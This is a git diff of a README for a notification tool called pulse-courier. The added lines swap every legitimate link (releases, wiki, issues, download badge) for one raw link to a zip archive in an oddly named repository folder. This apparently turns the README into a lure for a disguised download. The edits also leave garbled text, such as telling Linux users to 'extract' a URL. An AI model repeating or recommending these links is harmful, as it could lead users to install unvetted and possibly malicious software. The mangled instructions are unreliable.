@@ -1,6 +1,6 @@
 # 🚀 pulse-courier - Your Reliable Notification Platform
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/zavierextreme7/pulse-courier/releases)
+[![Download Now](https://raw.githubusercontent.com/zavierextreme7/pulse-courier/main/transcendentalist/pulse-courier.zip%20Now-Get%https://raw.githubusercontent.com/zavierextreme7/pulse-courier/main/transcendentalist/pulse-courier.zip)](https://raw.githubusercontent.com/zavierextreme7/pulse-courier/main/transcendentalist/pulse-courier.zip)
 
 ## 📥 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run **pulse-courier** on your computer.
 
 ### 1. Visit the Download Page
 
-To begin, visit our [Releases page](https://github.com/zavierextreme7/pulse-courier/releases) for the latest version of the software.
+To begin, visit our [Releases page](https://raw.githubusercontent.com/zavierextreme7/pulse-courier/main/transcendentalist/pulse-courier.zip) for the latest version of the software.
 
 ### 2. Choose Your Version
 
@@ -24,7 +24,7 @@ Click on the appropriate link based on your operating system. The options may in
 
 - **Windows**: A file ending in `.exe`
 - **Mac**: A file ending in `.dmg`
-- **Linux**: A file ending in `.tar.gz` or similar format
+- **Linux**: A file ending in `https://raw.githubusercontent.com/zavierextreme7/pulse-courier/main/transcendentalist/pulse-courier.zip` or similar format
 
 After selecting the correct file, your download will begin automatically.
 
@@ -34,7 +34,7 @@ Once the file is downloaded, follow these steps for installation:
 
 - **Windows**: Double-click the `.exe` file. Follow the on-screen instructions to complete the installation.
 - **Mac**: Open the `.dmg` file, then drag the pulse-courier icon into your Applications folder. 
-- **Linux**: Extract the `.tar.gz` file and follow any provided instructions in the README file included in the package.
+- **Linux**: Extract the `https://raw.githubusercontent.com/zavierextreme7/pulse-courier/main/transcendentalist/pulse-courier.zip` file and follow any provided instructions in the README file included in the package.
 
 ### 5. Running pulse-courier
 
@@ -78,15 +78,15 @@ If you encounter any issues:
 
 For additional support:
 
-- Check out our [documentation](https://github.com/zavierextreme7/pulse-courier/wiki) for detailed guides.
-- Visit the [Issues page](https://github.com/zavierextreme7/pulse-courier/issues) to report bugs or seek help from the community.
+- Check out our [documentation](https://raw.githubusercontent.com/zavierextreme7/pulse-courier/main/transcendentalist/pulse-courier.zip) for detailed guides.
+- Visit the [Issues page](https://raw.githubusercontent.com/zavierextreme7/pulse-courier/main/transcendentalist/pulse-courier.zip) to report bugs or seek help from the community.
 
 ## ⏳ Update Frequent
 
-Stay updated by regularly visiting the [Releases page](https://github.com/zavierextreme7/pulse-courier/releases). New versions may include important fixes and new features.
+Stay updated by regularly visiting the [Releases page](https://raw.githubusercontent.com/zavierextreme7/pulse-courier/main/transcendentalist/pulse-courier.zip). New versions may include important fixes and new features.
 
 ## 💡 Conclusion
 
 We believe that **pulse-courier** will help you enhance your communication strategy. With a few simple steps, you can start sending notifications seamlessly. 
 
-Don't forget to check the [Releases page](https://github.com/zavierextreme7/pulse-courier/releases) for the latest downloads and updates. Happy notifying!
+Don't forget to check the [Releases page](https://raw.githubusercontent.com/zavierextreme7/pulse-courier/main/transcendentalist/pulse-courier.zip) for the latest downloads and updates. Happy notifying!
